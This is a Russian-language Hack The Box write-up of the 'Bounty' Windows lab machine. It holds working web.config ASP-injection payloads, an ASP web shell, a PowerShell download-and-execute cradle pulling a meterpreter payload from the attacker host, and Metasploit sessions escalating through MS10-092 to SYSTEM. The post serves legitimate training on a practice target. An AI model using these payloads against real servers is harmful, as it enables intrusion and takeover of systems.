---
layout: post
title: "HTB{ Bounty }"
date: 2018-11-10 20:00:00 +0300
author: snovvcrash
tags: [write-up, hackthebox, machine, windows, iis, asp.net, web.config, unicorn, metasploit, ms10-092, stuxnet, juicy-potato]
---

**Bounty** — очень простая Windows-машина с 1000 и одним способом PrivEsc'а до админа. Выполнив инъекцию ASP-кода в файл конфигурации web.config веб-сервера IIS, мы получим юзера, а дальше все зависит только от твоего воображения. В рамках этого райтапа будем использовать Metasploit в качестве основного инструмента сбора сведений о локальных уязвимостях и постэксплуатации оных, однако напоследок я приведу список альтернативного ПО, которое с таким же успехом позволит выпотрошить эту тачку.

<!--cut-->

<p align="right">
	<a href="https://www.hackthebox.eu/home/machines/profile/142"><img src="https://img.shields.io/badge/%e2%98%90-Hack%20The%20Box-8ac53e?style=flat-square" alt="htb-badge.svg" /></a>
	<span class="score-medium">4.8/10</span>
</p>

![banner.png](/assets/images/htb/machines/bounty/banner.png)
{:.center-image}

![info.png](/assets/images/htb/machines/bounty/info.png)
{:.center-image}

* TOC
{:toc}

# Разведка
## Nmap
Initial:
```text
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.93
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Fri Nov  9 16:04:49 2018 as: nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.93
Nmap scan report for 10.10.10.93
Host is up, received user-set (0.072s latency).
Scanned at 2018-11-09 16:04:49 EST for 1s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Nov  9 16:04:50 2018 -- 1 IP address (1 host up) scanned in 0.99 seconds
```

Version ([красивый отчет](/assets/reports/nmap/htb/bounty/version.html)):
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl -p80 10.10.10.93
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Fri Nov  9 16:03:39 2018 as: nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl -p80 10.10.10.93
Nmap scan report for 10.10.10.93
Host is up, received echo-reply ttl 127 (0.067s latency).
Scanned at 2018-11-09 16:03:40 EST for 8s

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  9 16:03:48 2018 -- 1 IP address (1 host up) scanned in 9.03 seconds
```

Веб-сервер на 80-м порту, хостящийся на мелкомягком IIS. Наведаемся в гости.

# Web — Порт 80
## Браузер
Пикча волшебника (Мерлин, ты ли это?) во всю страницу по адресу `http://10.10.10.93:80`:

[![port80-browser-1.png](/assets/images/htb/machines/bounty/port80-browser-1.png)](/assets/images/htb/machines/bounty/port80-browser-1.png)
{:.center-image}

В исходниках кроме подтверждения нашей догадки о личности волшебника (и вправду Мерлин) ничего полезного не имеется:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Bounty</title>
<style type="text/css">
<!--
body {
  color:#000000;
  background-color:#B3B3B3;
  margin:0;
}

#container {
  margin-left:auto;
  margin-right:auto;
  text-align:center;
  }

a img {
  border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href=""><img src="merlin.jpg" alt="IIS7" width="571" height="411" /></a>
</div>
</body>
</html>
```

Однако, кое-что интересное можно увидеть, если заглянуть в заголовки HTTP-ответа:
```http
Accept-Ranges: bytes
Date: Fri, 09 Nov 2018 21:09:07 GMT
ETag: "20ba8ef391f8d31:0"
Last-Modified: Thu, 31 May 2018 03:46:26 GMT
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
```

На сайте используется технология `ASP.NET` (ну это и очевидно — IIS все таки). Используем это знание при поиске директорий gobuster'ом.

## gobuster
Переберем известные веб-директории, задав дополнительную опцию поиска — расширения `asp` и `aspx`:
```text
root@kali:~# gobuster -u 'http://10.10.10.93' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x asp,aspx -e -o gobuster/bounty.gobuster

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.93/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : asp,aspx
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2018/11/09 16:12:28 Starting gobuster
=====================================================
http://10.10.10.93/transfer.aspx (Status: 200)
http://10.10.10.93/UploadedFiles (Status: 301)
http://10.10.10.93/uploadedFiles (Status: 301)
http://10.10.10.93/uploadedfiles (Status: 301)
=====================================================
2018/11/09 16:45:34 Finished
=====================================================
```

Есть две зацепки: `/transfer.aspx` и `/uploadedfiles`. Поскольку имеем дело с сервером под Windows, пути регистронезависимые (поэтому, мы можем наблюдать `/UploadedFiles`, `/uploadedFiles` и `/uploadedfiles`, хотя это одна и та же страница).

`/transfer.aspx` — загрузчик файлов:

[![port80-browser-2.png](/assets/images/htb/machines/bounty/port80-browser-2.png)](/assets/images/htb/machines/bounty/port80-browser-2.png)
{:.center-image}

`/uploadedfiles` — предположительно путь, по которому загруженные способом выше файлы можно отыскать.

# /transfer.aspx
Экспериментальным образом устанавливаем, что среди прочих, `/transfer.aspx` позволяет импортировать расширения типа `.config`, выдавая позитивную надпись зеленым цветом:

[![port80-browser-3.png](/assets/images/htb/machines/bounty/port80-browser-3.png)](/assets/images/htb/machines/bounty/port80-browser-3.png)
{:.center-image}

Если же расширение находится в черном списке (как, к примеру, тот же `.aspx`), то нас огорчат краснобуквенной ошибкой:

[![port80-browser-4.png](/assets/images/htb/machines/bounty/port80-browser-4.png)](/assets/images/htb/machines/bounty/port80-browser-4.png)
{:.center-image}

## web.config
Итак, что же такое [web.config](https://ru.wikipedia.org/wiki/Web.config "Web.config — Википедия")? Грубо говоря, это просто XML-документ, содержащий набор настроек для `ASP.NET` веб-сервиса (чем-то напоминает `.htaccess` для Apache).

Чем он может стать полезным для злоумышленника? В случае, когда сервер блокирует загрузку `.asp` / `.aspx` сценариев (как раз наш случай), в web.config все равно можно инжектировать ASP-код, заставить его выполниться и получить RCE. Этим и займемся.

В [этом](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit "Upload a web.config File for Fun & Profit / Soroush Dalili (@irsdl) – سروش دلیلی") посте показана идея выполнения кода из web.config; [здесь](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config "RCE by uploading a web.config – 003Random’s Blog") демонстрируется принцип удаленного выполнения команд оболочки; и, наконец, [тут](https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c "Malicious web.config's") можно посмотреть на образцы более сложных пейлоадов (вплоть до крафта полноценного веб-шелла).

Пройдемся по эксплуатации web.config'а в 4-х шагах:
  1. Проверим факт выполнимости инъекций [[Trial]({{ page.url }}#webconfig-для-rce-trial)].
  2. Проверим факт выполнимости команд оболочки [[Proof-of-Concept]({{ page.url }}#webconfig-для-rce-proof-of-concept)].
  3. Скрафтим веб-шелл для получения базовой информации о системе [[Web-Shell]({{ page.url }}#webconfig-для-rce-web-shell)].
  4. На основании полученных данных скрафтим нагрузку для получения meterpreter-сессии и захватим пользователя [[Metasploit]({{ page.url }}#webconfig-для-rce-metasploit-внутри-машины)].

### web.config для RCE [Trial]
Проверяем работоспособность атаки [таким](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit "Upload a web.config File for Fun & Profit / Soroush Dalili (@irsdl) – سروش دلیلی") кодом:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

Выполнение простой математики: в случае успеха мы должны лицезреть результат операции сложения `1 + 2`.

Загрузим web.config на сервер и инициируем выполнение кода, перейдя по `http://10.10.10.93/uploadedfiles/web.config`:

[![port80-browser-5.png](/assets/images/htb/machines/bounty/port80-browser-5.png)](/assets/images/htb/machines/bounty/port80-browser-5.png)
{:.center-image}

Есть контакт, переходим к следующей фазе.

### web.config для RCE [Proof-of-Concept]
Модифицируем код для проверки возможности выполнения команд. Попытаемся получить пинг на свою машину:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<% Response.write("-"&"->") %>

<%
Set objShell = CreateObject("WScript.Shell")
objShell.Exec("cmd /c ping 10.10.14.14")
%>

<% Response.write("<!-"&"-") %>
-->
```

```text
root@kali:~# tcpdump -v -i tun0 'icmp[icmptype]==8'
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
16:41:26.864065 IP (tos 0x0, ttl 127, id 23611, offset 0, flags [none], proto ICMP (1), length 60)
    10.10.10.93 > kali: ICMP echo request, id 1, seq 5, length 40
16:41:27.844633 IP (tos 0x0, ttl 127, id 23892, offset 0, flags [none], proto ICMP (1), length 60)
    10.10.10.93 > kali: ICMP echo request, id 1, seq 6, length 40
16:41:28.828688 IP (tos 0x0, ttl 127, id 24184, offset 0, flags [none], proto ICMP (1), length 60)
    10.10.10.93 > kali: ICMP echo request, id 1, seq 7, length 40
16:41:29.811432 IP (tos 0x0, ttl 127, id 24455, offset 0, flags [none], proto ICMP (1), length 60)
    10.10.10.93 > kali: ICMP echo request, id 1, seq 8, length 40
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel
```

Снова успех, некст этап.

### web.config для RCE [Web-Shell]
Загрузим на сервер [веб-шелл](https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c#file-webshell-web-config "Malicious web.config's") в виде такого кода:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<% Response.write("-"&"->") %>

<%
Set oScript = Server.CreateObject("WScript.Shell")
Set oScriptNet = Server.CreateObject("WScript.Network")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<% Response.Write(Request.ServerVariables("SERVER_NAME")) %>
<p>
<b>The server's local address:</b>
<% Response.Write(Request.ServerVariables("LOCAL_ADDR")) %>
</p>
<p>
<b>The server's port:</b>
<% Response.Write(Request.ServerVariables("SERVER_PORT")) %>
</p>
<p>
<b>The server's software:</b>
<% Response.Write(Request.ServerVariables("SERVER_SOFTWARE")) %>
</p>
<p>
<b>Command output:</b>
<%
szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)
%>
</p>
<br>
</BODY>

<% Response.write("<!-"&"-") %>
-->
```

Который в жизни будет выглядеть таким образом:

[![port80-browser-6.png](/assets/images/htb/machines/bounty/port80-browser-6.png)](/assets/images/htb/machines/bounty/port80-browser-6.png)
{:.center-image}

И соберем информацию о машине.

1\. `whoami`. Спрашиваем имя пользователя, который крутит веб-сервер:

[![port80-browser-7.png](/assets/images/htb/machines/bounty/port80-browser-7.png)](/assets/images/htb/machines/bounty/port80-browser-7.png)
{:.center-image}

2\. ``(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell``. Спрашиваем, что используется по дефолту: CMD или PowerShell:

[![port80-browser-8.png](/assets/images/htb/machines/bounty/port80-browser-8.png)](/assets/images/htb/machines/bounty/port80-browser-8.png)
{:.center-image}

3\. `echo %cd%`. Узнаем текущую директорию:

[![port80-browser-9.png](/assets/images/htb/machines/bounty/port80-browser-9.png)](/assets/images/htb/machines/bounty/port80-browser-9.png)
{:.center-image}

4\. `wmic OS get OSArchitecture`. Узнаем архитектуру системы:

[![port80-browser-10.png](/assets/images/htb/machines/bounty/port80-browser-10.png)](/assets/images/htb/machines/bounty/port80-browser-10.png)
{:.center-image}

#### user.txt
5\. `type C:\Users\merlin\Desktop\user.txt`. И даже забираем флаг пользователя:

[![port80-browser-11.png](/assets/images/htb/machines/bounty/port80-browser-11.png)](/assets/images/htb/machines/bounty/port80-browser-11.png)
{:.center-image}

У нас есть все необходимое, чтобы получить полноценную сессию.

### web.config для RCE [Metasploit] (внутри машины)
Пользуемся msfvenom'ом для генерации нагрузки для PowerShell'а:
```text
root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=31337 -f psh --platform windows -a x64 -o sh3ll.ps1
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of psh file: 3241 bytes
Saved as: sh3ll.ps1
```

**[\*] Отступление**

[unicorn](https://github.com/trustedsec/unicorn "trustedsec/unicorn: Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.")'ом это можно сделать еще проще (создаваемые файлы: `powershell_attack.txt`, `unicorn.rc`):
```text
root@kali:~# python unicorn.py windows/meterpreter/reverse_tcp 10.10.14.14 443
...

root@kali:~# msfconsole -r unicorn.rc -q
...
```

Нацелим web.config на загрузку пейлоада:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<% Response.write("-"&"->") %>

<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.14:8881/sh3ll.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>

<% Response.write("<!-"&"-") %>
-->
```

Поднимем Python-сервер на 8881 порту, подготовим хэндлер Metasploit'а, выполним код из web.config и получим коннект на meterpreter (далее листинги кода взяты из моих старых заметок, поэтому они содержат оригинальную дату моего захвата Bounty, ибо времени перепроходить машину специально для райтапа не было; сорри за возможные опечатки :weary:):
```text
root@kali:~# msfdb run
[+] Starting database

msf > use exploit/multi/handler
msf exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.14      yes       The listen address (an interface may be specified)
   LPORT     31337            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.14:31337
[*] Sending stage (206403 bytes) to 10.10.10.93
[*] Meterpreter session 1 opened (10.10.14.14:31337 -> 10.10.10.93:49165) at 2018-08-29 09:28:53 -0400

meterpreter >
```

# PrivEsc: bounty\merlin → nt authority\system
Помучаем немного систему неагрессивной разведкой.

`meterpreter> sysinfo`:
```text
Computer        : BOUNTY
OS              : Windows 2008 R2 (Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

`shell> systeminfo`:
```text
Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          8/28/2018, 4:23:49 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 4/5/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,568 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,610 MB
Virtual Memory: In Use:    497 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
```

:exclamation:`Hotfix(s):  N/A`:exclamation:

Значит, делаем ставку на то, что система уязвима ~~КО ВСЕМУ НА СВЕТЕ!!!11~~ очень ко многому, что мы скоро и проверим.

`shell> whoami /priv`:
```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

`SeImpersonatePrivilege` включен, значит ко всему прочему админа можно получить с помощью *RottenPotatoNG*-like эксплойтов, к примеру, [Juicy Potato](https://github.com/ohpe/juicy-potato "ohpe/juicy-potato: A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM.") / [lonelypotato](https://github.com/decoder-it/lonelypotato "GitHub - decoder-it/lonelypotato: Modified version of RottenPotatoNG C++").

Однако, мы заниматься этим не будем, вместо чего пройдем до конца путь Metasploit'а, а именно воспользуемся модулем `post/multi/recon/local_exploit_suggester` для обнаружения локальных уязвимостей:
```text
meterpreter > CTRL-Z
Background session 1? [y/N] y

msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.93 - Collecting local exploits for x64/windows...
[*] 10.10.10.93 - 16 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[*] Post module execution completed
```

Повысим привилегии через эксплойт `ms10_092_schelevator` (0day-уязвимость 2010-го года в планировщике задач Windows; использовалась червем [Stuxnet](https://ru.wikipedia.org/wiki/Stuxnet "Stuxnet — Википедия"), к слову):
```text
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_092_schelevator
msf exploit(windows/local/ms10_092_schelevator) > show options

Module options (exploit/windows/local/ms10_092_schelevator):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION   1                yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.14      yes       The listen address (an interface may be specified)
   LPORT     31337            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008

msf exploit(windows/local/ms10_092_schelevator) > run

[*] Started reverse TCP handler on 10.10.14.14:31337
[*] Preparing payload at C:\Windows\TEMP\WpOwHkdDvRS.exe
[*] Creating task: zy1Znk9AEejePJi
[*] SUCCESS: The scheduled task "zy1Znk9AEejePJi" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\zy1Znk9AEejePJi...
[*] Original CRC32: 0x7c7441cc
[*] Final CRC32: 0x7c7441cc
[*] Writing our modified content back...
[*] Validating task: zy1Znk9AEejePJi
[*]
[*] Folder: \
[*] TaskName                                 Next Run Time          Status
[*] ======================================== ====================== ===============
[*] zy1Znk9AEejePJi                          9/1/2018 4:41:00 PM    Ready
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "zy1Znk9AEejePJi" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "zy1Znk9AEejePJi" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (206403 bytes) to 10.10.10.93
[*] SUCCESS: Attempted to run the scheduled task "zy1Znk9AEejePJi".
[*] SCHELEVATOR
[*] Deleting the task...
[*] SUCCESS: The scheduled task "zy1Znk9AEejePJi" was successfully deleted.
[*] SCHELEVATOR
[*] Meterpreter session 2 opened (10.10.14.14:31337 -> 10.10.10.93:49168) at 2018-08-29 09:41:04 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## root.txt
И заберем root-флаг:
```text
meterpreter > cat C:/Users/Administrator/Desktop/root.txt
c837f7b6????????????????????????
```

Bounty пройдена :triumph:

![owned-user.png](/assets/images/htb/machines/bounty/owned-user.png)
{:.center-image}

![owned-root.png](/assets/images/htb/machines/bounty/owned-root.png)
{:.center-image}

![trophy.png](/assets/images/htb/machines/bounty/trophy.png)
{:.center-image}

# Эпилог
## Утилиты
Некоторые другие exploration/exploitation -инструменты (отличные от Metasploit), с помощью которых можно было получить информацию о доступных на машине уязвимостях и/или захватить суперпользователя:
  * [Merlin](https://github.com/Ne0nd0g/merlin "Ne0nd0g/merlin: Merlin is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in golang.") (может, этот фреймворк был бы самым каноничным из-за КДПВ на главной сайта?);
  * [Sherlock](https://github.com/rasta-mouse/Sherlock "rasta-mouse/Sherlock: PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.") (старая версия Watson'а);
  * [Watson](https://github.com/rasta-mouse/Watson "rasta-mouse/Watson") (новая версия Sherlock'а).
